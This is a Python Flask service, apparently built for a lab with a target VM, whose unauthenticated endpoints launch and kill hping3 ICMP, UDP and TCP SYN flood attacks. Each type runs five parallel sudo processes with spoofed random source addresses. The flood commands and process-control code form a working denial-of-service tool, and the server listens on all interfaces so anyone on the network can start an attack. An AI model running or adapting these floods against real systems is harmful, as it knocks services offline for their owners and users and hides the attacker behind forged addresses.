from flask import Flask, jsonify
import subprocess
import os
import signal
import logging
import time

app = Flask(__name__)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# --- KONFIGURASI ---
# Ganti dengan IP VM Target Anda
TARGET_IP = "192.168.18.20"
# ---------------------

# Global dictionary to track active attack processes
# Format: {"icmp": [pid1, pid2, ...], "udp": [...], "tcp": [...]}
active_attacks = {
    "icmp": [],
    "udp": [],
    "tcp": []
}

def start_attack_processes(attack_type, command, count=5):
    """
    Start multiple hping3 processes for an attack type.
    """
    try:
        # Check if hping3 is available
        if not os.path.exists("/usr/sbin/hping3") and not os.path.exists("/usr/bin/hping3"):
            return {"status": "error", "message": "hping3 not installed"}

        # Stop existing attacks of this type first
        stop_attack_processes(attack_type)

        # Start new processes
        pids = []
        failures = 0
        for i in range(count):
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                preexec_fn=os.setpgrp  # Create new process group
            )
            time.sleep(0.1)
            # Check if the process exited immediately
            if process.poll() is not None:
                logger.error(f"hping3 {attack_type} process {i+1} exited immediately with code {process.returncode}")
                failures += 1
            else:
                pids.append(process.pid)
                logger.info(f"Started {attack_type} attack process {i+1}/{count} with PID {process.pid}")

        active_attacks[attack_type] = pids

        if len(pids) == 0:
            return {
                "status": "error",
                "message": f"All {attack_type.upper()} hping3 processes exited immediately! Sudo rights? hping3 installed and accessible?",
                "pids": []
            }

        msg = f"{attack_type.upper()} attack started with {len(pids)} processes"
        if failures > 0:
            msg += f" ({failures} processes failed to start or exited immediately)"

        return {
            "status": "success" if len(pids) > 0 else "error",
            "message": msg,
            "pids": pids
        }
    except Exception as e:
        logger.error(f"Error starting {attack_type} attack: {e}")
        return {"status": "error", "message": str(e)}

def stop_attack_processes(attack_type):
    """
    Stop all processes for a specific attack type.
    """
    try:
        pids = active_attacks.get(attack_type, [])

        if not pids:
            return {
                "status": "success",
                "message": f"No active {attack_type.upper()} attack to stop"
            }

        stopped_count = 0
        for pid in pids:
            try:
                os.kill(pid, signal.SIGKILL)
                stopped_count += 1
                logger.info(f"Force-killed {attack_type} attack process with PID {pid}")
            except ProcessLookupError:
                logger.warning(f"Process {pid} already terminated")
            except Exception as e:
                logger.error(f"Error stopping process {pid}: {e}")

        active_attacks[attack_type] = []

        return {
            "status": "success",
            "message": f"Force-killed {stopped_count} {attack_type.upper()} attack process(es)"
        }
    except Exception as e:
        logger.error(f"Error stopping {attack_type} attack: {e}")
        return {"status": "error", "message": str(e)}

def kill_all_attacks():
    """
    Aggressively kill all hping3 processes, regardless of tracking.
    """
    try:
        # Try pkill for full-force kill
        result = subprocess.run(['sudo', 'pkill', '-9', '-f', 'hping3'],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        # Reset all tracking
        for k in active_attacks.keys():
            active_attacks[k] = []
        logger.info("Executed pkill for all hping3 processes.")
        return {
            "status": "success",
            "message": "Killed all attack processes via pkill -9 -f hping3.",
            "stderr": result.stderr.decode().strip()
        }
    except Exception as e:
        logger.error(f"Error killing all attacks: {e}")
        return {"status": "error", "message": str(e)}

@app.route('/attack/icmp/start')
def start_icmp_attack():
    """Start ICMP flood attack with 5 processes."""
    command = f"sudo hping3 --icmp --flood --rand-source {TARGET_IP}"
    result = start_attack_processes("icmp", command, 5)
    logger.info(f"ICMP attack start: {result}")
    return jsonify(result), 200 if result["status"] == "success" else 500

@app.route('/attack/udp/start')
def start_udp_attack():
    """Start UDP flood attack with 5 processes, big packets, to port 5201."""
    # DO NOT use --rand-dest. Use -p 5201 --data 1400, as in your manual test
    command = f"sudo hping3 --udp --flood --rand-source -p 5201 --data 1400 {TARGET_IP}"
    result = start_attack_processes("udp", command, 5)
    logger.info(f"UDP attack start: {result}")
    return jsonify(result), 200 if result["status"] == "success" else 500

@app.route('/attack/tcp/start')
def start_tcp_attack():
    """Start TCP SYN flood attack to port 5201 with 5 processes."""
    command = f"sudo hping3 -S --flood --rand-source -p 5201 {TARGET_IP}"
    result = start_attack_processes("tcp", command, 5)
    logger.info(f"TCP attack start: {result}")
    return jsonify(result), 200 if result["status"] == "success" else 500

@app.route('/attack/killall', methods=['POST', 'GET'])
def kill_all_attack_endpoint():
    """Aggressively stop all attacks. This is your KILL ALL ATTACKS BUTTON endpoint."""
    result = kill_all_attacks()
    logger.info(f"KILL ALL ATTACKS: {result}")
    return jsonify(result), 200 if result["status"] == "success" else 500

@app.route('/attack/status')
def get_attack_status():
    """Return JSON with currently active attacks."""
    # Clean up PIDs of dead processes
    for attack_type in active_attacks:
        active_pids = []
        for pid in active_attacks[attack_type]:
            try:
                os.kill(pid, 0)
                active_pids.append(pid)
            except ProcessLookupError:
                pass
        active_attacks[attack_type] = active_pids

    status = {
        "icmp": {
            "active": len(active_attacks["icmp"]) > 0,
            "process_count": len(active_attacks["icmp"]),
            "pids": active_attacks["icmp"]
        },
        "udp": {
            "active": len(active_attacks["udp"]) > 0,
            "process_count": len(active_attacks["udp"]),
            "pids": active_attacks["udp"]
        },
        "tcp": {
            "active": len(active_attacks["tcp"]) > 0,
            "process_count": len(active_attacks["tcp"]),
            "pids": active_attacks["tcp"]
        }
    }

    return jsonify(status), 200

if __name__ == '__main__':
    debug_mode = os.environ.get('FLASK_DEBUG', '0') == '1'
    app.run(host='0.0.0.0', port=5002, debug=debug_mode)
